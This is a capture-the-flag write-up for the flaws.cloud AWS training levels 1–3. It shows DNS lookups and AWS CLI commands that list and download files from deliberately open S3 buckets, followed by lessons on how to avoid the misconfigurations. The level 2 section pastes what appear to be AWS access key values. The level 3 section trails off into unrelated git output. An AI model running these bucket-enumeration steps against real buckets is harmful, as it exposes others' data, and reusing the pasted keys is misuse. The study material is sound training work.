# Level 1
This level is *buckets* of fun. http://flaws.cloud/

The site flaws.cloud is hosted as an S3 bucket. This is a great way to host a static site, similar to hosting one via github pages. Some interesting facts about S3 hosting: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud). Also, S3 buckets are a global name space, meaning two people cannot have buckets with the same name. The result of this is we could create a bucket named apple.com and Apple would never be able host their main site via S3 hosting.

We can determine the site is hosted as an S3 bucket by running a DNS lookup on the domain, such as: 
```
└─$ nslookup Flaws.cloud
```
```
Non-authoritative answer:
Name:   flaws.cloud
Address: 52.218.181.18
Name:   flaws.cloud
Address: 52.218.152.106
Name:   flaws.cloud
Address: 52.92.186.75
Name:   flaws.cloud
Address: 52.92.195.211
Name:   flaws.cloud
Address: 52.218.213.58
Name:   flaws.cloud
Address: 52.218.217.26
Name:   flaws.cloud
Address: 52.92.139.115
Name:   flaws.cloud
Address: 52.92.249.3
```
We can then run: 
```
└─$ nslookup 52.218.181.18
```
```
18.181.218.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.

Authoritative answers can be found from:
```
So we know it's hosted in the AWS region us-west-2 s3 bucket.
flaws.cloud can also be visited by going to http://flaws.cloud.s3-website-us-west-2.amazonaws.com/ 

We now know that they have a bucket named `flaws.cloud` in `us-west-2`, so we can attempt to browse the bucket by using the aws cli by running: 
```
└─$ aws s3 ls s3://flaws.cloud
```
```

Unable to locate credentials. You can configure credentials by running "aws configure".
```

Let's try adding --no-sign-request
```
└─$ aws s3 ls s3://flaws.cloud --no-sign-request
```
```

BOOM!!!
Let's Download this secret using this command:
```
└─$ aws s3 cp s3://flaws.cloud/secret-dd02c7c.html --no-sign-request secret.html
```
```
download: s3://flaws.cloud/secret-dd02c7c.html to ./secret.html
```
and Open it
```
└─$ open secret.html
```
```

### Lesson learned
On AWS you can set up S3 buckets with all sorts of permissions and functionality including using them to host static files. A number of people accidentally open them up with permissions that are too loose. Just like how you shouldn't allow directory listings of web servers, you shouldn't allow bucket listings.
#### Examples of this problem
- Directory listing of S3 bucket of [Legal Robot](https://hackerone.com/reports/163476) and [Shopify](https://hackerone.com/reports/57505).
- Read and write permissions to S3 bucket for [Shopify again](https://hackerone.com/reports/111643) and [Udemy](https://hackerone.com/reports/131468). This challenge did not have read and write permissions, as that would destroy the challenge for other players, but it is a common problem. 

### Avoiding the mistake
By default, S3 buckets are private and secure when they are created. To allow it to be accessed as a web page, I had turn on "Static Website Hosting" and changed the bucket policy to allow everyone "s3:GetObject" privileges, which is fine if you plan to publicly host the bucket as a web page. But then to introduce the flaw, I changed the permissions to add "Everyone" to have "List" permissions. "Everyone" means everyone on the Internet. You can also list the files simply by going to http://flaws.cloud.s3.amazonaws.com/ due to that List permission.

# Level 2
Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

This level is fairly similar, with a slight twist. we're going to need our own AWS account for this. we just need the free tier. 

Create a IAM user with permissions of "AmazonS3FullAccess" and create a access keys for AWS Cli.

We need our own AWS key, and we need to use the AWS CLI. Similar to the first level, we can discover that this sub-domain is hosted as an S3 bucket with the name "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud".

By using this command, we're letting the CLI know which set of credentials it should use when accessing AWS resources.
```
└─$ aws configure --profile gteksd
```
```
AWS Access Key ID [None]: AKIAZ34HBEFSHI4VJEP4F
AWS Secret Access Key [None]: //YlybQlLErQz0gsdfvktUYG4l5WDFQAXNfzvhUz
Default region name [None]: 
Default output format [None]: 
```

Its permissions are too loose, but we need our own AWS account to see what's inside. Using our own account we can run: 
```
└─$ aws s3 ls --profile gteksd s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```
```

```

BOOM!!!
Let's save the secret2 file.
```
└─$ aws s3 cp --profile gteksd s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html secret2.html

### Lesson learned
Similar to opening permissions to "Everyone", people accidentally open permissions to "Any Authenticated AWS User". They might mistakenly think this will only be users of their account, when in fact it means anyone that has an AWS account.

### Examples of this problem
- Open permissions for authenticated AWS user on Shopify (link) 

### Avoiding the mistake
Only open permissions to specific AWS users. This screenshot is from the webconsole in 2017.

# Level 3
Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud

Like the first level, you should have figured out how to list the files in this directory, and seen that listing in this bucket is open to "Everyone". See the file listing at level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com

Note: switching to 'f52ec03b227ea6094b04e43f475fb0126edb5a61'.

You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may do so (now or later) by using -c with the switch command.
Example:
  git switch -c <new-branch-name>

Or undo this operation with:
  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at f52ec03 first commit
